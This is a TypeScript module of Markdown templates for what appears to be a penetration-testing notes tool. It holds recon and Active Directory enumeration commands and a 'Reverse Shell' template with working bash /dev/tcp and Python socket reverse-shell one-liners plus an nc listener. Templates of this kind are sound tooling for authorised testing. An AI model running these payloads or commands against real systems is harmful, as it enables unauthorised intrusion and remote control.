export interface Template {
  name: string
  content: string
}

const TEMPLATES: Template[] = [
  { name: 'Empty', content: '# Title\n\n' },
  {
    name: 'Enumeration',
    content: `# Enumeration — {{RHOST}}

## Network

\`\`\`bash
nmap -p- -T4 -oA nmap-all {{RHOST}}
nmap -sV -sC -p$PORTS -oA nmap-svc {{RHOST}}
\`\`\`

## Services

-

## Notes

-
`
  },
  {
    name: 'Web',
    content: `# Web — {{RHOST}}

## Recon

\`\`\`bash
whatweb http://{{RHOST}}
gobuster dir -u http://{{RHOST}} -w /usr/share/wordlists/dirb/common.txt
\`\`\`

## Findings

-

## Exploitation

\`\`\`bash

\`\`\`
`
  },
  {
    name: 'Active Directory',
    content: `# Active Directory — {{DOMAIN}}

## Domain enumeration

\`\`\`bash
crackmapexec smb {{RHOST}} -u '' -p '' --shares
nxc smb {{RHOST}} -u {{USER}} -p {{PASSWORD}} --users
\`\`\`

## BloodHound

\`\`\`bash
bloodhound-python -u {{USER}} -p {{PASSWORD}} -d {{DOMAIN}} -ns {{RHOST}} -c All
\`\`\`

## Notes

-
`
  },
  {
    name: 'PrivEsc',
    content: `# Privilege Escalation — {{RHOST}}

## Checklist

- [ ] sudo -l
- [ ] SUID binaries
- [ ] Cron jobs
- [ ] Writable services / PATH

\`\`\`bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
\`\`\`

## Findings

-
`
  },
  {
    name: 'Reverse Shell',
    content: `# Reverse Shell — {{RHOST}}:{{LPORT}}

## Listener

\`\`\`bash
nc -lvnp {{LPORT}}
\`\`\`

## Payloads

\`\`\`bash
bash -i >& /dev/tcp/{{RHOST}}/{{LPORT}} 0>&1
\`\`\`

\`\`\`bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{RHOST}}",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
\`\`\`
`
  },
  {
    name: 'Notes + Commands',
    content: `# Title

## Notes

-

## Commands

\`\`\`bash

\`\`\`
`
  }
]

export function listTemplates(): string[] {
  return TEMPLATES.map((t) => t.name)
}

export function getTemplateContent(name: string): string {
  return TEMPLATES.find((t) => t.name === name)?.content ?? ''
}
